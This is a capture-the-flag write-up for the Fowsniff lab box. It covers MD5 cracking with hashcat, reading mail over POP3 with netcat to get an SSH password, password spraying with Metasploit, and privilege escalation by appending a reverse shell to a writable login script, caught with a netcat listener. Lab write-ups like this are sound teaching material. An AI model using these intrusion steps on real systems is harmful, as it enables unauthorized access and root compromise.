# Fowsniff CTF

## nmap
Relevant ports:

- 22    (ssh)

- 80    (http)

- 110   (pop3)

## @fowsniffcorp
https://x.com/fowsniffcorp -> http://pastebin.com/NrAqVeeX -> 404 Not Found

https://web.archive.org/web/20200606121945/pastebin.com/NrAqVeeX -> leak.txt

From leak.txt: users, hashes.md5

## hashcat
```bash
hashcat -a0 -m0 -O hashes.md5 /opt/wordlists/rockyou.txt
```
returns passwords for all users except 'stone'

## pop3
(metasploits auxiliary/scanner/pop3/pop3_login didn't work)

```bash
nc $IP 110
USER seina      # -> OK
PASS scoobydoo2 # -> OK
LIST            # -> OK 2 Messages
RETR 1          # -> Temporary ssh password: S1ck3nBluff+secureshell
```

## ssh
Using msfconsole:
```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS $IP
set USER_FILE users
set PASSOWRD S1ck3nBluff+secureshell
run
```

This will open 1 ssh session with user 'baksteen'

```bash
ssh baksteen@$IP
# baksteen@$IP's password: S1ck3nBluff+secureshell
```

## privesc
```bash
groups                      # -> users baksteen
find / -group users -type f # -> /opt/cube/cube.sh

# using python reverseshell
echo 'python3 -c ...' >> /opt/cube/cube.sh
logout
```

```bash
# Terminal 1
nc -lnvp 1234
```

```bash
# Terminal 2
ssh baksteen@$IP
```

```bash
# Terminal 1
cat /root/flag.txt
```
